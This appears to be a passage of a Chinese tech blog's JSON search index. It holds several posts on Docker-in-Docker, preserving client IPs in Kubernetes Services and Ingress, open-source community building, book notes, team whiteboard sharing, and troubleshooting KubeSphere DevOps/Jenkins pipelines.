86400;\u0026#34;] volumeMounts: - mountPath: /var/run/docker.sock name: volume-docker volumes: - hostPath: path: /var/run/docker.sock type: \u0026#34;\u0026#34; name: volume-docker 创建 Deployment 1 kubectl apply -f dood.yaml 查看创建的 Pod 名 1 2 3 kubectl get pod |grep dood dood-667d8bcfc6-d5fzf 1/1 Running 0 15s 进入 Pod 1 kubectl exec -it dood-667d8bcfc6-d5fzf -c docker-cli sh 测试是否使用的是主机的 Docker Daemon 1 2 3 docker images |wc 69 482 8509 符合预期，这里 Docker 命令使用的就是外部的 Docker Daemon。\n5. 参考 https://medium.com/better-programming/about-var-run-docker-sock-3bfd276e12fd https://github.com/jpetazzo/dind ","description":"","id":268,"section":"post","tags":["博文","Docker","Kubernetes","Containers","CI"],"title":"如何在 Docker 中使用 Docker","uri":"https://www.chenshaowen.com/blog/how-to-use-docker-in-docker.html"},{"content":" Kubernetes 依靠 kube-proxy 组件实现 Service 的通信与负载均衡。在这个过程中，由于使用了 SNAT 对源地址进行了转换，导致 Pod 中的服务拿不到真实的客户端 IP 地址信息。本篇主要解答了在 Kubernetes 集群中负载如何获取客户端真实 IP 地址这个问题。\n1. 创建一个后端服务 1.1 服务选择 这里选择 containous/whoami 作为后端服务镜像。在 Dockerhub 的介绍页面，可以看到访问其 80 端口时，会返回客户端的相关信息。在代码中，我们可以在 Http 头部中拿到这些信息。\n1 2 3 4 5 6 7 8 9 Hostname : 6e0030e67d6a IP : 127.0.0.1 IP : ::1 IP : 172.17.0.27 IP : fe80::42:acff:fe11:1b GET / HTTP/1.1 Host: 0.0.0.0:32769 User-Agent: curl/7.35.0 Accept: */* 1.2 集群环境 集群有三个节点，一个 master ，两个 worker 节点。\n1 2 3 4 5 6 kubectl get node -o wide NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME master Ready master 91d v1.17.9 192.168.13.4 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-957.21.3.el7.x86_64 docker://19.3.8 node1 Ready worker 91d v1.17.9 192.168.13.5 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-957.21.3.el7.x86_64 docker://19.3.8 node2 Ready worker 91d v1.17.9 192.168.13.6 \u0026lt;none\u0026gt; CentOS Linux 7 (Core) 3.10.0-957.21.3.el7.x86_64 docker://19.3.8 1.3 创建服务 创建命名空间 1 kubectl create ns realip 创建负载 1 kubectl -n realip run myservice --image=containous/whoami 创建服务 1 kubectl -n realip expose deploy myservice --type=NodePort --port=80 查看创建的服务 1 2 3 4 5 6 7 8 9 10 kubectl -n realip get pod,deploy,svc -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pod/myservice-fc55d766-9ttxt 1/1 Running 0 2m1s 10.233.70.42 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; NAME READY UP-TO-DATE AVAILABLE AGE CONTAINERS IMAGES SELECTOR deployment.apps/myservice 1/1 1 1 2m1s myservice containous/whoami run=myservice NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service/myservice NodePort 10.233.13.66 \u0026lt;none\u0026gt; 80:31509/TCP 5s run=myservice 访问服务 浏览器打开 Master 节点的 EIP + :31509 时，返回如下内容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 Hostname: myservice-fc55d766-9ttxt IP: 127.0.0.1 IP: 10.233.70.42 RemoteAddr: 192.168.13.4:21708 GET / HTTP/1.1 Host: dev.chenshaowen.com:31509 User-Agent: Chrome/86.0.4240.198 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: lang=zh; Dnt: 1 Upgrade-Insecure-Requests: 1 可以看到 RemoteAddr 是 Master 节点的 IP ，并不是访问客户端的真实 IP 地址。\n1.3 准备 Ingress Controller 和 LB 这里为了更好模拟生产环境的场景，增加了可能的两个链路节点 Ingress 和 Load Balancer(以下简称 LB) 。\n安装 Ingress Controller 参考文档: 使用 Helm 安装 Ingress\n准备 LB 这里使用的是云厂商的 LB，如果是物理机，也可以使用针对物理机的 LB。当然，也可以使用 keepalived + haproxy 替代 LB。\n2. 直接通过 NortPort 访问获取真实 IP 在上面的访问中，获取不到客户端真实 IP 的原因是 SNAT 使得访问 SVC 的源 IP 发生了变化。将服务的 externalTrafficPolicy 改为 Local 模式可以解决这个问题。\n执行命令:\n1 kubectl -n realip patch svc myservice -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;externalTrafficPolicy\u0026#34;:\u0026#34;Local\u0026#34;}}\u0026#39; 访问服务，可以得到如下内容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Hostname: myservice-fc55d766-9ttxt IP: 127.0.0.1 IP: 10.233.70.42 RemoteAddr: 139.198.254.11:51326 GET / HTTP/1.1 Host: dev.chenshaowen.com:31509 User-Agent: hrome/86.0.4240.198 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cache-Control: max-age=0 Connection: keep-alive Cookie: lang=zh; Dnt: 1 Upgrade-Insecure-Requests: 1 Cluster 隐藏了客户端源 IP，可能导致第二跳到另一个节点，但具有良好的整体负载分布。 Local 保留客户端源 IP 并避免 LoadBalancer 和 NodePort 类型服务的第二跳，但存在潜在的不均衡流量传播风险。(Kubernetes 官方解释)\n下面是对比简图：\n当请求落到没有服务 Pod 的节点时，将无法访问。用 curl 访问时，会一直停顿在 TCP_NODELAY , 然后提示超时:\n1 2 3 4 5 6 * Trying 139.198.112.248... * TCP_NODELAY set * Connection failed * connect to 139.198.112.248 port 31509 failed: Operation timed out * Failed to connect to 139.198.112.248 port 31509: Operation timed out * Closing connection 0 3. 通过 LB -\u0026gt; Service 访问获取真实 IP 在生产环境，通常会有多个节点同时接收客户端的流量，如果仅使用 Local 模式将会导致服务可访问性变低。引入 LB 的目的是为了利用其探活的特点，仅将流量转发到存在服务 Pod 的节点上。\n如下图可以看到，在服务的 31509 端口仅 master 节点处于活跃状态，流量也仅会导向 master 节点，符合预期。\n接着继续增加副本数量到 3\n1 2 3 4 5 6 7 kubectl -n realip scale deploy myservice --replicas=3 kubectl -n realip get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES myservice-fc55d766-9ttxt 1/1 Running 0 144m 10.233.70.42 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; myservice-fc55d766-f8wbs 1/1 Running 0 5m13s 10.233.90.143 node1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; myservice-fc55d766-nzwzn 1/1 Running 0 5m13s 10.233.70.45 master \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 遗憾的是，Pod 并没有均匀分布在三个节点，其中有两个处于 master 上。因此 LB 的后端节点也没有完全点亮。如下图:\n这就需要给 deploy 加上反亲和性的描述。执行命令:\n1 kubectl -n realip edit deploy myservice 这里有两种选择。第一种是配置软策略，但不能保证全部 LB 后端点亮，均匀分配到流量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 spec: template: metadata: labels: app: myservice spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - myservice topologyKey: kubernetes.io/hostname 另一种是配置硬策略，强制 Pod 分配在不同的节点上，但会限制副本数量，也就是 Pod 总数不能超过 Node 总数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 spec: template: metadata: labels: app: myservice spec: affinity: podAntiAffinity: requiredDuringSchedulingIgnoredDuringExecution: - labelSelector: matchExpressions: - key: app operator: In values: - myservice topologyKey: kubernetes.io/hostname 采用硬策略的配置，最终点亮全部后端，如下图:\n4. 通过 LB -\u0026gt; Ingress -\u0026gt; Service 访问获取真实 IP 如果每一个服务都占用一个 LB，成本很高，同时配置不够灵活，每次新增服务时，都需要去 LB 增加新的端口映射。\n还有一种方案是 LB 将 80、443 的流量导给 Ingress Controller，然后将流量转发到 Service，接着达到 Pod 中的服务。\n此时，需要 LB 能做 TCP 层的透传，或者 HTTP 层的带真实 IP 转发，将 Ingress Controller 的 externalTrafficPolicy 设置为 Local 模式，而 Service 可以不必设置为 Local 模式。\n如果想要提高可访问性，同样可以参考上面配置反亲和性，保证在每个后端节点上都有 Ingress Controller 。\n将 Ingress Controller 改成 DaemonSet 也是一种部署方式。\n访问服务，可以得到如下内容:\nHostname: myservice-7dcf6b965f-vv6md IP: 127.0.0.1 IP: 10.233.96.152 RemoteAddr: 10.233.70.68:34334 GET / HTTP/1.1 Host: realip.dev.chenshaowen.com:30000 User-Agent: Chrome/87.0.4280.67 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cache-Control: max-age=0 Cookie: _ga=GA1.2.896113372.1605489938; _gid=GA1.2.863456118.1605830768 Cookie: lang=zh; Upgrade-Insecure-Requests: 1 X-Forwarded-For: 139.198.113.75 X-Forwarded-Host: realip.dev.chenshaowen.com:30000 X-Forwarded-Port: 80 X-Forwarded-Proto: http X-Original-Uri: / X-Real-Ip: 139.198.113.75 X-Request-Id: 999fa36437a1180eda3160a1b9f495a4 X-Scheme: http 在 X-Forwarded-For 中，已经能够拿到客户端的真实 IP 信息。\n在有个文档中，我看到强调还需在 Ingress configuration 中增加如下内容\n1 2 3 4 5 data: compute-full-forwarded-for: \u0026#39;true\u0026#39; forwarded-for-header: X-Forwarded-For use-forwarded-headers: \u0026#39;true\u0026#39; # use-proxy-protocol: \u0026#34;true\u0026#34; 但这里并没有配置，也能拿到 Forward 字段信息，可能和 Ingress Controller 版本有关。如果在返回中没有 X- 头部时，可以尝试。\n这里贴一下 Ingress 的相关配置\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 kubectl -n realip get ingress realip -o yaml apiVersion: extensions/v1beta1 kind: Ingress metadata: annotations: kubesphere.io/creator: admin generation: 1 name: realip namespace: realip resourceVersion: \u0026#34;38923603\u0026#34; selfLink: /apis/extensions/v1beta1/namespaces/realip/ingresses/realip spec: rules: - host: realip.dev.chenshaowen.com http: paths: - backend: serviceName: myservice servicePort: 80 path: / status: loadBalancer: {} 1 2 3 kubectl get svc -n realip router-realip NodePort 10.233.39.119 \u0026lt;none\u0026gt; 80:30000/TCP 3h18m 流量的转发路径:\nLB(80/443) -\u0026gt; Ingress Controller(30000) -\u0026gt; myservice(80) -\u0026gt; myservice-fc55d766-xxxx(80)\n5. 总结 本文介绍了三种获取真实 IP 的部署方式：\n直接通过 NortPort 访问获取真实 IP 受制于 Local 模式，可能会导致服务不可访问。需要保证对外提供入口的节点上，必须具有服务的负载。\n通过 LB -\u0026gt; Service 访问获取真实 IP 利用 LB 的探活能力，能够提高服务的可访问性。适用于服务较少，或者愿意每个服务一个 LB 的场景。\n通过 LB -\u0026gt; Ingress -\u0026gt; Service 访问获取真实 IP 通过 LB 将 80、443 端口的流量转到 Ingress Controller ，再进行服务分发。但 Ingress Controller 使用 Local 模式，就要求 LB 的每个后端节点都有 Ingress Controller 副本。适用于对外暴露服务数量较多的场景。\n当然也可以组合使用，对于并不需要获取客户端真实 IP 的服务，可以继续使用 Cluster 模式。\n6. 参考文档 https://hub.docker.com/r/containous/whoami https://kubernetes.io/zh/docs/tutorials/services/source-ip/ ","description":"","id":269,"section":"post","tags":["博文","Kubernetes","IP","Demo"],"title":"在 Kubernetes 中如何获取客户端真实 IP","uri":"https://www.chenshaowen.com/blog/how-to-get-the-real-ip-of-client-in-kubernetes.html"},{"content":"1. 开源越来越受欢迎 2019 年的 IDC 北美开源软件使用调查显示，71% 的企业正在使用开源软件，54% 的企业计划扩大使用范围。2020 年的 RedHat 企业开源现状调查显示，有 95% 的 IT 领导者认为企业开源对于企业基础架构软件战略至关重要。\n一方面企业越来越接受开源软件，另一方面企业也开始参与开源。现在思考的主要问题，不再是用不用，而是怎样用好开源软件。\n可以说开源迎来了一个大时代，对协作模式、研发流程、产品发布等方方面面产生了深远的影响。\n2 开源的核心是管理和运营社区 开源不是公开源代码，而是管理和运营社区。\n很多关于开源的讨论在强调，license、管理风险、安全风险等防守策略。对于大企业，这些无法避免，为了获得上层的支持，却给开源带来了极大的负担，最终没有精力管理和运营社区。\n社区的特征是共识与协作。开源项目是开源社区的共识，也是开源协作的对象。社区成员质量越高、数量越多，就越能代表该领域的先进性。\n在有限的人群上，可以构建无限的社区。但在无限的社区上，个人又只能投入有限的精力和时间。这就是开源项目之间争夺的焦点。\n更多高质量的人、更长时间地参与是开源项目成功的关键。\n3. 开源与商业并不冲突 前面说到开源主要是在管理和运营社区，而社区又具有自发性和开放性，提供了很多免费的服务。\n之前的一位同事说开源就是白嫖，搭了一个框架，啥都没有，写了 Bug 想着社区给擦屁股。他就是站在社区的角度在思考。社区是反感被利用，被商业化的。\n但，你看 Google 开源的 Kubernetes , 各大厂商都有发行托管版本、如火如荼的 CKA/CKD 认证考试，也有商业化部分却并没有引起社区反感。这些厂商在 Kubernetes Toc 却占有一席之地，提交了很多 PR, 促进了开源项目的发展。\n开源社区的用户也需要商业服务。在软件生命周期内，有很多脏活累活是用户不想参与的，都可以成为商业服务的切入点。开源与商业是相互促进与成就的。\n4. 像经营企业一样经营开源项目 我更愿意以经营企业类比开源项目。开源项目不是项目，不是一次性的。开源项目应该与企业一样，追求永续经营。\n一个企业软件的发布是一群人共同努力的结果。需要产品经理、设计师、研发、测试、文档、市场、运营等人员的通力合作，才能交付一个可靠的版本。\n可以将整个开源协作理解为一条供应链，需要社区分工协作，人人参与，人人贡献，最终完成组装达成目标。管理开源项目，就是管理这样一条供应链。\n我想起一个故事: 在灾荒之年，能吃的都被吃了，大家聚在一起准备迁徙，但饿着肚子实在走不动。突然，有个人拿出来一块肉，准备和大家一起吃了再走。接着，有人找来了锅，有人在拾柴火，有人准备挑水，有人挖来了野菜，有人拿出了攒着的面粉\u0026hellip;\u0026hellip; 就这样煮出来满满一大锅肉汤，大家吃饱一起上路了。\n这是一个自由的群体，时刻有人离开，也会有人加入。社区治理是一个很大的话题，也是一个很老的话题，可以在社区设立子部门，分工协作；可以建立指挥中心避免分歧，一致向前。但能不能按时开饭，每次有没有肉，很大程度在于能不能激发大家参与的积极性。\n5. 目标是贡献者而不是 star 参与需求反馈、测试、设计、讨论、提建议、文档撰写、宣传、问题回复等，都可以称之为贡献者，而不局限于写代码。\nstar 是一个十分量化的指标，经常被用来衡量一个开源项目的受欢迎程度。我认为 DAU/MAU 也同样适用于开源项目。\n观测开源项目应该看的是有多少贡献者、贡献者的质量、每天合并了多少 PR、一个 PR 的合并周期、提交了多少 Issues，一个 Issue 得到回复的等待时间。活的烂项目比死的好项目更具有持久地生命力。只要有人在社区参与贡献，错误的内容终究会得到纠正。\n明确目标之后，社区的很多决策就会简单很多。贡献者最重要，那么你就会重视社区用户的反馈，认真地看待用户提出的问题，线上会议，线下走访，深入交流，甩掉那些没有成效的事情。\n聚拢足够多的意见领袖，高质量的贡献者才是关键。\n6. 云原生可能是个机会 我在之前的文档中提到 现在是云原生最好的时代 。\n云原生的技术架构具有分布式的特点，天生有利于开源协作。也反映出，组织架构与软件架构具有一致性。\n传统的基于单机 Linux 系统的软件设施，正在往基于 Kubernetes 系统的软件设施迁移。涉及整个软件体系的方方面面，各行各业也在努力融入其中。\n这是云原生的机会，也是更是开源社区的机会。\n","description":"","id":270,"section":"post","tags":["博文","思考","开源","社区","运营","云原生"],"title":"开源的核心是管理和运营社区","uri":"https://www.chenshaowen.com/blog/the-core-of-open-source-is-community.html"},{"content":"\n","description":"","id":271,"section":"post","tags":["博文","Jenkins","Kubernetes","白板分享"],"title":"白板分享 - Jenkins on Kubernetes","uri":"https://www.chenshaowen.com/blog/whiteboard-jenkins-on-kubernetes.html"},{"content":"作者: [美] 约翰·D·洛克菲勒\n出版社: 吉林出版集团有限责任公司\n出版年: 2012-1-1\nISBN: 9787546369785\nNotes:\n成功的路直接而明亮，失败的路却是各有不同。\n","description":"","id":272,"section":"post","tags":["书籍","人生","工作","选择","态度"],"title":"洛克菲勒给孩子的38封信","uri":"https://www.chenshaowen.com/blog/book/the-38-letters-of-rockefeller-to-children.html"},{"content":"1. 曾经的尝试 在博文没有标签的你，让人无法想起中，我强调在趋同的群体中，个体成为了背景噪声，而标签成为了有效的信息。\n在下面这张图中，我们很难记住某一个人，但是却很容易通过 A、B、C、D、E 标签找到某一个人。\n标记之后，人与人之间会形成网络，而所有的标签构成了一个群体的特征。通过这些标签，提供了进一步划分群体的可能。\n具有更多同类标签的人聚在一起，沟通成本更低，可以更好应对挑战。不同标签的人相互补充，取长补短，生存能力更强。\n在之前的团队中，在 leader 的支持下，我曾让成员给自己丰富标签，寻找互相更多的交集，更好融合团队。同时，根据兴趣划分工作之外的研习小组，跟踪最新的技术动态，以主题的形式相互促进和成长，并组织以组为单位的分享。\n2. 分享如此重要 在博文打造一致性的团队中，我强调要保持认知水平和工具链一致，以降低协作成本。\n那么如何去保持这种一致性呢？答案就是分享。\n沟通成本是阻碍组织变大的主要障碍。一个人的事，自己决定；两个人的事商量决定；三个人的是投票决定。参与的人越多，达成一致，落地执行的周期就越长，常常就会错失机会。\n在博文研发如练兵，运营如用兵中，我提到打造优秀团队的关键是建立好的机制，给成员通道，让他们向优秀靠拢。\n一种定期分享、互相交流、不断学习的机制，我想应该位列其中。\n通过分享，可以让组织内的知识流动起来。活水不断涌出，团队才能保持生机。而对于软件开发开发团队，我强调软件产品是团队能力的输出，团队的领域能力才是产品的核心竞争力。日积月累地强化团队在某个领域的能力，让团队中的每个人有成长的通道，让个人技能成为团队的技能，是如此重要。\n3. 什么是白板分享 不需要太多准备 常见的分享形式是 PPT 。准备 PPT，写好备注，然后约个大家空闲的时间，找个会议室，手拿翻页笔，内心还有些忐忑地开始分享了。形式化，周期长，耗精力。直接的结果就是分享频次降低，参与人数减少。\n重沟通而轻内容 以往分享的重点更强调内容，要求充分调研，内容权威，这其实阻碍了交流。无论认知深浅，都应该优先分享自己掌握的部分。如果有偏差，可以及时矫正；如果一致，则可以继续强化。这对团队，都是有收益的。\n频率 x 质量 = 收益。提高质量是不能一蹴而就的，需要大量地积累、持续地投入、广泛地合作。而频率是调动积极性地关键，次数上去了参与的人会越来越活跃，内容也会越来越有深度。\n那么白板分享的形式是怎么样的呢？\n一个会议室白板 一张 A4 纸 一个 web 页面 一张架构图 一张思维导图 一页 PPT 一篇分析报告 一个 word 文档 \u0026hellip; 只要分享者舒适，可长可短，可多可少，可线上可线下，可会议室可工位，能简单讲清楚一件事，都应该被认可。我们鼓励的是列出要点，描绘轮廓，而不是过多的细节。技术行业知识更新很快，从业者通常具备快速学习地能力。我想他们更希望收益的是，其他领域的概况，同领域的深度。通过一页纸，能获取需要数天甚至数周才能获取的知识要点，是非常诱人的。而且这些知识点通常贴近团队的工作场景，比公众号、微博内容更具实践性。\n","description":"","id":273,"section":"post","tags":["博文","思考","团队","研发","白板分享","什么是"],"title":"什么是白板分享","uri":"https://www.chenshaowen.com/blog/what-is-whiteboard-sharing.html"},{"content":"作者: 杜军\n出版社: 电子工业出版社\n出版年: 2019-10\nISBN: 9787121373398\nNotes:\n网络是 Kubernetes 中不易掌握的一个难点。网络故障会直接影响现有的负载，通常是十分紧急的问题。而网络相关的知识相较于应用开发更底层，很多的细节，需要长期的积累。\n书中相关的要点之前陆续都有所接触，通过阅读这本书，可以帮助梳理知识体系。这是一本不错的 Kubernetes 网络相关书籍，推荐对 Kubernetes 具有使用经验，但是对数据包如何转发、各种插件如何实现等细节感兴趣的人阅读。\n","description":"","id":274,"section":"post","tags":["书籍","Kubernetes","网络"],"title":"Kubernetes网络权威指南：基础、原理与实践","uri":"https://www.chenshaowen.com/blog/book/the-guide-to-kubernetes-network.html"},{"content":" 本篇主要介绍如何运维 DevOps 流水线，怎么解决一些常见的问题。问题主要分为两大类，一类是 Kubernetes 相关的，具有一定通用性；另一类是与业务相关，需要对领域有所了解，解决问题时才能事半功倍。文档内容，会不断滚动更新。\n1. Kubernetes 问题排查 1.1 基本的创建流程 如上图所示，是用户创建一个 Deployment 的简单流程。主要分为以下步骤:\nkubectl 根据用户输入的命令，填充相关字段，将 deployment/pvc 对象发送给 kube-apiserver kube-apiserver 会有一系列的权限/准入控制，最终将数据序列化存储在 etcd 中 kube-controller-manager 包含大量的控制器，这些控制器会生成 replicaset/pod 对象存储在 etcd 中。pvc 需要绑定到 pv 上，如果没有满足要求的 pv，则通过 Storage Class 动态创建一个 pv 。 kube-sheduler 负责给 pod 选择运行的 node 节点，然后将 NodeName 字段写入 pod 对象中。 kubelet 发现当前 node 节点有待创建的 pod，然后开始调用 CRI 接口去管理 pod 的生命周期。如果有 pvc，还需要将远程磁盘挂载到宿主机目录。 了解基本的创建流程，有利于排查各种可能的故障。故障可以理解为集群生命周期中的一个状态，而创建是整个生命周期的起点。同时，重置、重启是非常快速地解决问题的方法，都涉及创建。\n1.2 解决集群故障的思路 如上图所示，是我的集群故障修复思路。主要分为以下步骤：\nkubectl get 检查 node、pod 等资源是否符合预期 kubectl describe 查看 Kubernetes 中的事件信息，包括 kube-sheduler 的调度、拉取镜像、启动是否成功等。通常能解决大部分的问题。 kubectl logs 查看负载的日志。当 pod 处于 running，但是又无法正常提供服务时，logs 信息能够给出有用的提示。有时无法查看 pod 中容器的日志，那么需要去 pod 所在的节点查看 docker 的日志。journal 通过 -u 参数指定服务，通过 -f 查看滚动的最新日志，也十分有用。 如果上面两种思路还不能解决问题，那么恭喜你，又有机会提高自己了。检查底层服务，也就是检查集群的基础环境，包括磁盘、允许的协议、允许的端口、防火墙、网络等。最终能不能解决，取决于你的积累和检索问题答案的能力。 1.3 必要的检查项 这里列举一些必要的检查项，可以辅助排查问题。\nnode 负载 node 负载过高时，有可能导致节点 NotReady。\nnode 磁盘 磁盘包括两部分，大小和 inode。\nswap、firewall 安装集群时的配置，在重启机器之后，可能会失效。\n跨 node 的 pod 通信 跨节点通信异常时，会导致服务无法访问。\nnode 节点上 kubelet、docker 的状态 systemctl status kubelet、systemctl status docker 查看组件的状态。\n检查 kubelet 、docker 的配置 ps aux|grep kubelet 、docker info 查看相关配置是否符合预期。\n查看存储 CSI 存储插件日志 通常 StorageClass 是通过 CSI 插件提供存储服务的，可以查看相关日志，检查是否有异常输出。\n检查 ip 转发功能 执行命令 cat /proc/sys/net/ipv4/ip_forward ，如果输出 0 则表示未开启。ip 转发允许将一个端口的包转发到另外一个端口。未开启时，会导致网络访问失败，tcpdump 中发送了大量 syn 数据包，但是没有 ack 。\n检查 Pod CIDR 与主机网段是否冲突 可以先查看 Pod 的 ip，检查其与主机、VPC 的 ip 是否有重叠。如果发生冲突，将会导致服务不可访问，提示 No route to host 类似的错误，需要修改 CIDR 。\n2. 安装问题 如上图所示，是 installer 在执行安装 DevOps 时的依赖关系。DevOps 主要有两个核心组件 S2I 和 Jenkins 。S2I 依赖于 minio 存储文件，Jenkins 依赖于 uc 提供插件下载、依赖 openldap 打通账户体系。\n安装时，比较常见的是 minio 安装失败，导致 DevOps 无法继续安装。而 minio 安装失败通常又是存储和网络导致。\n3. Jenkins 运维问题 3.1 修改默认配置导致异常 DevOps 允许用户自定义配置，但 Jenkins /configureSecurity/ 页面中鉴权和 CSRF Protection 不要修改。\n修改上图，红色框中的内容，会导致流水线无法使用。\n3.2 大量多分支流水线占满磁盘空间 多分支流水线扫描时，会将仓库拉取到 /var/jenkins_home/cache 中，查找 jenkinsfile 文件。\n如果大量实践多分支流水线扫描，请将 Jenkins 的 pv 设置大一些，50 GB 以上。\n3.3 Lightweight 问题导致并发流水线冲突 具体可以参考文档: Jenkins 中 Lightweight 拉取代码问题分析\n3.4 多节点集群，无法创建流水线 节点之间通信问题，可以将 ks-controller-manager 和 ks-jenkins 调度到一个节点进行验证。\n如果能够创建成功，那么 Pod 的跨节点通信有问题。\n3.5 流水线并发数量少 调整 ks-jenkins 的 cpu 和 memory 限制，还有 Xms、Xmx 值。\n具体调整可以参考文档: Kubernetes 动态创建 Jenkins Agent 压力测试\n3.6 流水线部署报错 Jenkins 的 Kubernetes Deploy 插件提示可读性不是十分友好，可能的原因有:\napiVersion 版本不支持 namespace 没有提前创建 yaml 本身有问题 凭证有问题 创建的凭证和使用的凭证 ID 不一致 可以在节点上直接执行 kubectl apply 进行验证。怀疑凭证有问题时，可以直接使用 admin 的凭证，进行确认。\n如果是 EKS 集群，请参考 https://github.com/kubesphere/community/issues/165 单独生成凭证。EKS 上使用 DevOps 进行部署，需要的是 token 类型的凭证，证书类型的凭证没有足够的权限。简单点，可以直接使用 kubectl -n kubesphere-system get secret kubesphere-token-xxx -o jsonpath={.data.token} | base64 -d 拿到 token，替换至 kubeconfig 。\n3.7 流水线一直 Pending，Kubernetes 无法创建 Pod 如果流水线无法执行，并且 kubectl -n kubesphere-devops-system get pod 下没有发现为运行流水线新创建的 Pod，那么很有可能是受限于准入控制。\nkube-apiserver 提供了在创建负载时，修改负载相关信息的能力。比如，Istio 通过 webhook 在创建 Pod 时，向其中注入 Sidecar 进行微服务治理。但如果 Istio 组件发生了异常，那么也会导致 Pod 一直等待注入，从而无法创建 Pod 的现象。\n解决办法是，给运行的命名空间加上豁免注入的标签，比如，kubectl label namespace kubesphere-devops-system istio-injection=disabled 。\n3.8 变量引用不生效或者流水线引用变量报错 ${env.\u0026lt;ParameterName\u0026gt;} 、${params.\u0026lt;ParameterName\u0026gt;}、${\u0026lt;ParameterName\u0026gt;} 都可以引用变量，也可以用于 Stage 之间传值。在引用变量时，常见的错误是没区分单双引号。单引号并不替换变量，双引号才会替换变量，这与 Shell 一致。\n另外需要注意，作用域。如果提示 groovy.lang.MissingPropertyException: No such property: ，而你又十分确认定义了这个变量，那么很有可能是作用域的问题。只需要带上 env、params 再试一次就行。\n3.9 图形化编辑时，报错 至少需要一个嵌套步骤 API 提示报错 instance failed to match at least one schema 。流水线部分，前端页面图形化与后端数据模型是通过 pipeline-model-api 插件相互转换的。具体接口是 /tojson 和 /tojenkinsfile ，前端编辑的是 json ，后端需要的是 jenkinsfile 。\n例如，下面这个示例:\n1 2 3 4 5 6 7 8 9 10 pipeline { agent any stages { stage (\u0026#39;Hello\u0026#39;) { steps { echo \u0026#34;Hello\u0026#34; } } } } 将被转换为如下内容:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026#34;pipeline\u0026#34;:{ \u0026#34;stages\u0026#34;: [ { \u0026#34;branches\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;default\u0026#34;, \u0026#34;steps\u0026#34;: [ { \u0026#34;arguments\u0026#34;: [ { \u0026#34;key\u0026#34;: \u0026#34;message\u0026#34;, \u0026#34;value\u0026#34;: { \u0026#34;isLiteral\u0026#34;: true, \u0026#34;value\u0026#34;: \u0026#34;Hello\u0026#34; } } ], \u0026#34;name\u0026#34;: \u0026#34;echo\u0026#34; } ] } ], \u0026#34;name\u0026#34;: \u0026#34;Hello\u0026#34; } ], \u0026#34;agent\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;any\u0026#34; }, \u0026#34;parameters\u0026#34;: {} } json 格式的流水线对前端十分友好，scheme 非常简单，极大降低实现图形化编辑的难度。转换失败时，页面会展示错误提示。如果返回错误提示为空，那么页面会展示 当前 Jenkinsfile 不是标准的声明式 Jenkinsfile，无法进行图形化显示 。\n前端只覆盖了常见的几种情况，提示不是十分准确，例如，当 defaultValue 为空字符串时，提示 至少需要一个嵌套步骤 ，不知所云。最好能够直接参考 /tojson 接口的返回进行处理。\n3.10 构建镜像时，无法访问外部服务，报错 timeout 在 Jenkinsfile 中执行 docker build 命令时，由于是 Docker in Docker 网络，使用的是 Node 节点上的 Docker Daemon 进行构建。看着是动态创建的 Pod 无法访问外网，其实是 Node 节点无法访问指定外部服务。\n这很有可能是，对网络要求严格的运行环境，禁止了主机访问外网所致。使用 iptables 命令，添加白名单即可。\n3.11 升级时，PVC 报错 常见的两种报错提示是 The PersistentVolumeClaim \u0026quot;pvc1\u0026quot; is invalid: spec: Forbidden: is immutable after creation except resources.requests for bound claims 和 Error: UPGRADE FAILED: cannot patch \u0026quot;mysql\u0026quot; with kind PersistentVolumeClaim: persistentvolumeclaims \u0026quot;mysql\u0026quot; is forbidden: only dynamically provisioned pvc can be resized and the storageclass that provisions the pvc must support resize 。\n报错原因是 StorageClass 不支持动态扩容，需要保持升级前后 PVC 容量一致。\n在升级之前，可以通过 describe 命令检查 StorageClass 是否支持动态扩容。如果 AllowVolumeExpansion 被设置，则代表支持；否则不支持。\n3.12 安装不兼容的插件之后，Jenkins 无法启动 处理办法是进入 Jenkins 运行的 Pod，删掉不兼容的插件。\n首先 exec 进入 Pod\n1 kubectl -n kubesphere-devops-system exec -it ks-jenkins-xxx bash 然后进入 /var/jenkins_home/plugins 目录，删掉 Jenkins Pod 日志中提到的引发错误的插件。如果你安装了大量的插件，这里有一个技巧是按照日期删除。\n有时候，插件之间具有复杂依赖，还有一个救急的方式是直接清空 /var/jenkins_home/plugins ，Jenkins 会根据 /var/jenkins_home/plugins.txt 从 UC 中下载插件，恢复至初始状态。\n3.13 修改鉴权策略之后，无法登陆 